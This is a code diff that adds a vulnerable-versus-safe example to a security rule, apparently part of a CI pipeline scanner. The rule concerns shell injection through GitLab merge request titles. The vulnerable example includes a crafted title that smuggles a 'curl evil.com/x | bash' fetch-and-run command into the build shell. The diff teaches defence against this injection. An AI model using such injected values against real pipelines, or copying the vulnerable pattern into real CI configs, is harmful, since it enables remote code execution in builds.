@@ -33,6 +33,28 @@ RULE = Rule(
         "controls. Interpolating them into a shell body executes the "
         "crafted content as part of the build."
     ),
+    exploit_example=(
+        "# Vulnerable: an MR titled ``feat: shiny new thing\";\n"
+        "# curl evil.com/x | bash;\"`` executes the curl in the\n"
+        "# build's shell context. The MR author needs no special\n"
+        "# privilege — any branch contributor can open one.\n"
+        "build:\n"
+        "  script:\n"
+        "    - echo \"Building MR $CI_MERGE_REQUEST_TITLE\"\n"
+        "    - ./build.sh\n"
+        "\n"
+        "# Safe: pass the untrusted value through an env var and\n"
+        "# quote it. The shell sees the value as one argument; the\n"
+        "# attacker's injected ``;`` / ``$()`` / backticks are\n"
+        "# literal characters in the printed string, not parsed\n"
+        "# tokens.\n"
+        "build:\n"
+        "  script:\n"
+        "    - echo \"Building MR $MR_TITLE\"\n"
+        "    - ./build.sh\n"
+        "  variables:\n"
+        "    MR_TITLE: $CI_MERGE_REQUEST_TITLE"
+    ),
 )
 
 
